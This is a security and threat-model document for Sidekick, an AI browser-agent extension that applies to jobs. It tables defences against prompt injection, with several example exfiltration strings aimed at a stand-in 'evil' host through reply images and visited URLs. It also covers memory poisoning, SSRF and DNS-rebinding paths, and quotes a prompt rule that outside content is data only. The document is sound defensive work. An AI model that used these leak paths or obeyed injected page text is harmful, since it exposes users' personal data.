# Sidekick security (v0.9.6; audited 2026-10-28, re-read 2026-10-29)

Sidekick holds your API key, profile, resume, memories and chats, reads every page you visit when asked, and can click and type for you. The main threat is a hostile web page, search result, file or site tool trying to make Sidekick leak your data or act against you (prompt injection). The model itself is assumed to be fallible: it may follow injected text, so the important protections are in code, not in the prompt.

## What protects you (all covered by tests)

| Threat | Protection | Tests |
|---|---|---|
| Page text tells the model what to do | All outside content (pages, frames, search results, files, selections, site-tool results, agent snapshots) is fenced in `<untrusted_content>`; a page can't close the fence early or fake a new one. Prompts say: data, never instructions. | security 2, 7 |
| Zero-click leak through a reply (`![](https://evil/?d=your data)`, CSS `url()`, `<video poster>`, SVG, iframes) | Replies can't load anything: images become plain links; img/svg/video/iframe/style/link/meta/base/form tags and src/srcset/style/poster/action/ping attributes are removed. Verified in real Chrome: zero requests. | security 1, hardening 1 (400 fuzzed replies), real-chrome 4 |
| A link in a reply replaces the panel with a fake Sidekick (phishing) | Links always open in a new tab; only http(s)/mailto links are kept. | security 1, real-chrome 4 |
| Leak through a URL the agent visits or chat reads (`https://evil/?e=you@x.edu`) | `navigate`/`open_tab` to a URL containing your name, email, phone, address or links, or carrying >300 chars of data, needs your approval. `read_url` refuses such links. | security 4, 5 |
| A site's "read-only" tool (WebMCP) gets your data | Read-only tools run without asking only when the arguments contain none of your personal details; everything else asks. | security 5 |
| Your resume sent to a fake "upload to win" page | The first upload on each site (the frame that receives it) asks you, unless a shortcut you already approved there includes it. | e2e, real-chrome 6 |
| A shortcut used on the wrong site | A shortcut only runs on the site it was learned on. | security 5 |
| One gate forgotten or loosened | Every final action goes through `orchestrator/policy.ts decide()`; refusals are unit-tested (money/delete/post, non-submitting site tools, payment pages, non-ATS frames, read-only). | unit orchestrator |
| Runaway API spend | Daily and monthly caps checked before every model call (`core/llm/budget.ts`), unpriced models counted at the highest price; a cap hit stops workers at a step boundary and pauses the orchestrator. | jsdom orchestrator, unit orchestrator |
| An approved application batch used to submit anywhere | A batch pre-approves submits only on each job's own site (`preApproved.sites`), as a plan with "submit without asking" would; payments, deleting and posting still ask; going to another site asks. | real-chrome 17 |
| The agent passes a CAPTCHA or pretends to be a person | Clicks on CAPTCHA / "verify you are human" elements are refused in code (`CAPTCHA_RE`); sign-ins go to the user (`ask_user`), and an unanswered question in a batch sets the job aside after 8 minutes. The prompt also says to answer truthfully when a form asks about AI. | real-chrome 17 |
| Web content or the assistant's own words become "memories" | Facts learned from a message come only from the user's own words (the prompt excludes `<untrusted_content>` and the reply; `cleanRemembered` drops secrets and tiny strings); a cover letter may never discuss eligibility (`voiceProblems`), so a posting can't make the letter say he doesn't qualify. | memory-session 1b, unit jobs |
| A job posting steers the cover letter or the agent | The posting's text is fenced as untrusted content in the letter prompt and in the agent's goal; the letter is checked by code (`voiceProblems`), never run as instructions. | unit jobs |
| An attacker's page on a shared host (`evil.github.io`, `*.vercel.app`) riding an approval given to another page there | "Site" is the registrable domain from the full Public Suffix List (`tldts`, private section included), plus a hand-kept list of shared hosts the list lacks (`medium.com`, `substack.com`, …); the narrower answer wins. Plan approval, upload approval, sharing checks and shortcuts treat two owners' pages as different sites. The list is the copy bundled with `tldts` 7.4.19; new shared hosts arrive with package updates. | sites 1, safety 6, unit security |
| Passwords, card numbers, SSNs, security codes typed by the agent | Refused in the page (field names, input types, values) and before typing (Luhn card check, SSN, API keys), for type, fill_fields, site forms and replays. | security 5, 7, engine |
| Secrets you paste into chat | Masked before sending and before saving chat history; you're told. | security 4, real-chrome 5 |
| Final or destructive actions | Submit/send/pay/delete/post clicks (by the model's flag *or* by the button's words), Enter in bigger forms, and non-read-only site tools all need your approval. "Never act on" sites (banks etc.) can be read but not touched. | agent-cdp, security 5, 7 |
| Your local network (router, NAS, cloud metadata) | `read_url` refuses private, loopback, link-local, CGNAT, .local/.lan/.internal, IPv6 private and IPv4-mapped addresses, decimal/hex IP tricks, and public links that redirect into your network: redirects are followed one hop at a time and each target is checked before it is requested (Chrome reports the target through `webRequest`, a read-only permission). A public name that answers from a private address is not read. Fetches never send cookies. | security 3 |
| Injected text becoming permanent (memory, skills) | Web/file content is stripped before the end-of-chat review; skills refuse injected instructions, fence tags and secrets; you're told whenever a skill is learned and can edit/delete it. The chat `remember` tool only saves facts (never standing preferences). | phase3 1, 4 |
| Learned data storing your answers | Shortcuts store which profile field to use, never the value; written answers are never stored; site notes are learned from a value-free step list. | sites 2, e2e |
| Internal tags leaking into replies (`<untrusted_content>` shown as text) | Fence and pipeline tags are stripped in code from every reply before it's shown, saved or copied. | fixes 7, real-chrome 11 |
| The agent acting in a tab you opened, or pulling you back to its tab | Only tabs the page opens right after the agent's own click are followed; screenshots never switch tabs. | fixes 5 |
| Your details sent to a search engine by the agent | web_search refuses queries containing your name, email, phone, address or links. | multitask 4 |
| Earlier chat steering the agent | The chat history the agent gets is fenced as data (replies can quote web pages); only the newest message is the task. | multitask 6 |
| A page steers the agent to another site, or to type your details somewhere unrelated | Before going to a site not used yet in the task, or typing your details on a new site, the fast model checks the step against your own words. It never sees the page, so the page can't argue with it. Flagged or check failed → you decide. | safety 4 |
| Hidden instructions for AI on a page | Everything Sidekick reads is scanned locally for instructions aimed at an AI; a warning is added outside the fence and the agent is told to report it. | safety 5, real-chrome 13 |
| Invisible "trap" fields (off the page, clipped to nothing) | Not listed to the agent at all; it's told they were left out. | safety 5, real-chrome 13 |
| The page switching sites between "look" and "act" | The tab's site is re-checked right before every click or keystroke; if it changed, nothing happens and the new page is shown. | safety 5 |
| "Submit without asking" going too far | Only after you approve a plan with that option, only on the plan's sites, never for pay/buy/delete/post. | safety 3, real-chrome 13 |
| Websites detecting Sidekick | The WebMCP capture script adds nothing to pages that don't use WebMCP. | security 6, real-chrome 7 |
| Run traces (Agent runs page) | Saved only in this Chrome profile, like chats. They hold page text and what the agent typed (your profile details), never passwords or card numbers (the agent can't type those). Export masks card numbers, API keys and ID numbers again; the page warns that the file has page text and your details. Traces are shown as text only (an exported file someone sends you can't run code or load anything; only JPEG/PNG screenshots are shown). Turn recording off in Settings → Agent. | traces 4, 5 |
| A wrong double-check replacing a right answer | Replacement needs code evidence (objective/residuals under both setups, or the checker's answer fails its own code check → rejected). | verify, phase3 5, hardening 3 (property test) |

## Remaining risks (be aware)

- The local injection scan catches common phrasings only; the fence and the code rules are still the real protection. Claude in Chrome also uses a trained classifier on everything it reads; Sidekick can't run one locally.

- **Prompt injection is not solved**, for anyone. A page can still mislead the model within what it's allowed to do without asking: give a wrong summary, pick the wrong option in a form, or type your profile details into fields on the site you're applying to. Final actions, uploads, and data leaving through URLs or site tools ask you first; review those prompts.
- **Site notes** are learned from page labels, so a hostile site can influence the notes for *its own* site only; they're shown inside the untrusted fence.
- **Your API key and data** are stored unencrypted in this Chrome profile (`chrome.storage.local`), like every extension. Anyone with access to your Chrome profile can read them.
- **`read_url` and private DNS names:** a public name that resolves to a private address (`127.0.0.1.nip.io`, DNS rebinding) is refused, but only after Chrome has sent that one request (extensions can't resolve a name before fetching). Redirects into your network are refused before any request is sent (v0.9.6).
- **Built-in web search** (Claude's server-side search) runs at Anthropic; queries are written by the model.
- **WebMCP** is an experimental standard (Chrome behind a flag); its API may change.
- Real-site behavior (Greenhouse, Workday, MyOpenMath) still needs testing with your own accounts.

## How it's tested

- `tests/jsdom/security-test.js` (29 checks): attacks on each boundary above. `tests/unit/security.test.ts`: the same rules as plain functions.
- `tests/jsdom/hardening-test.js` (10): 400 fuzzed hostile replies, 40 fuzzed hostile pages, property tests on the double-check, stop mid-check, stress, accessibility.
- `tests/chrome/real-chrome-test.js` (56): the real extension in real Chromium (MV3 CSP, chrome.scripting, chrome.debugger, content scripts) against a local web server; also asserts that nothing reaches any outside server during the run.
